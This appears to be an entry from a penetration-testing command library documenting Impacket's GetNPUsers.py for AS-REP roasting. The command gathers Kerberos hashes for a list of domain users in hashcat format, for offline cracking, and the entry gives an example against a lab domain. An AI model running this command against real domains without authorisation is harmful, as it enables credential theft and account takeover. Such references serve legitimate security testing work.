---
id: 775ffc51-cb0f-4716-9067-f346dd8b4007
name: getnpusers-usersfile-hashcat
type: command
executor: bash
data: >-
  python GetNPUsers.py $_DOMAIN/ -usersfile $_USERS_FILE -format hashcat
  -outputfile $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:04.983402+00:00'
updated_at: '2023-04-10T20:26:39.227036+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - bulk
verified: true
validated: true
---

# getnpusers-usersfile-hashcat

## Command

```bash
python GetNPUsers.py $_DOMAIN/ -usersfile $_USERS_FILE -format hashcat -outputfile $_OUTPUT_FILE
```

## Description

Roasts AS-REP for multiple users listed in a file, outputting hashes in hashcat format.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain | Yes |
| -usersfile $_USERS_FILE | Path to file with usernames (one per line) | Yes |
| -format hashcat | Hashcat output format | Yes |
| -outputfile $_OUTPUT_FILE | Output file for hashes | Yes |

## Examples

### Basic Usage

```bash
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

## Expected Output

Multiple lines of $krb5asrep$ hashes for each roastable user in the output file.

## Related

- [[procedures/Kerberos-AS-REP-Roasting-Attack]]
- [[tools/Impacket]]
